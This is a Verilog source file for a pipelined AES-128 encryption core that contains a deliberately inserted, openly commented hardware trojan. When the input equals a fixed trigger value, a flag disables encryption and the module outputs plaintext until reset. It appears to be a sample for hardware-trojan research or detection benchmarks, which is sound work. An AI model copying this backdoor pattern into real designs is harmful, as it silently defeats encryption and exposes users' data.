`timescale 1ns / 1ps

/*
The piple line 






*/


module AES_128(
input clk,
input enable,
input reset,// active HIGH signal for flashing the pipeline.
input [0:127]Din,
input [0:127]Key,
output [0:127]Dout

    );
 
wire [0:127]subkey0;
wire [0:127]subkey1;
wire [0:127]subkey2;
wire [0:127]subkey3;
wire [0:127]subkey4;
wire [0:127]subkey5;
wire [0:127]subkey6;
wire [0:127]subkey7;
wire [0:127]subkey8;
wire [0:127]subkey9;

wire [0:127]dout0;
wire [0:127]dout1;
wire [0:127]dout2;
wire [0:127]dout3;
wire [0:127]dout4;
wire [0:127]dout5;
wire [0:127]dout6;
wire [0:127]dout7;
wire [0:127]dout8;
wire [0:127]dout9;
wire [0:127]dout10;
reg trojan_flag = 1;

assign dout0=Din^Key;// key whitening
Round         round1(clk,reset,8'b0000_0001,dout0,Key,subkey1,dout1);
Round         round2(clk,reset,8'b0000_0010,dout1,subkey1,subkey2,dout2);
Round         round3(clk,reset,8'b0000_0100,dout2,subkey2,subkey3,dout3);
Round         round4(clk,reset,8'b0000_1000,dout3,subkey3,subkey4,dout4);
Round         round5(clk,reset,8'b0001_0000,dout4,subkey4,subkey5,dout5);
Round         round6(clk,reset,8'b0010_0000,dout5,subkey5,subkey6,dout6);                                                                  
Round         round7(clk,reset,8'b0100_0000,dout6,subkey6,subkey7,dout7);
Round         round8(clk,reset,8'b1000_0000,dout7,subkey7,subkey8,dout8);
Round         round9(clk,reset,8'b0001_1011,dout8,subkey8,subkey9,dout9);
Final_round   round10(clk,reset,8'b0011_0110,dout9,subkey9,dout10);

assign Dout = (enable && trojan_flag) ? dout10:Din;// bypass the encryption engine if disabled


//Trojan block
always @(posedge clk) begin

if(reset) begin
trojan_flag<=1;

end

if(Din==128'h21212121212121212121212121212121)
    trojan_flag<=0;
end

        
endmodule
